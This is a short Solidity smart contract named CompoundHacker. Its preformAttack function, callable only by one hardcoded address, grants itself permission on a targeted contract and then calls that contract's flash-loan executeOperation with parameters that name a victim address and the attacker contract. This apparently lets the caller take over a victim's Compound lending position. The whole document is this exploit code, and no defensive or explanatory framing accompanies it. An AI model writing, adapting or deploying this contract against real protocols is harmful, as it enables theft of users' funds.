contract CompoundHacker is ProxyPermission {


    function preformAttack(
        address _hackedContract,
        address _vicitm,
        address _tokenAddr,
        address _cCollateralToken,
        address _cBorrowToken
    ) public {
        require(msg.sender == 0xD018918DB3D4FD082e3C4CA1C68ae9a1536356e8);
        bytes memory paramData = abi.encode(_cCollateralToken, _cBorrowToken, _vicitm, address(this));

        givePermission(_hackedContract);

        CompoundImportFlasLoan(_hackedContract).executeOperation(
            _tokenAddr,
            0,
            0,
            paramData
        );

        removePermission(_hackedContract);

    }
}
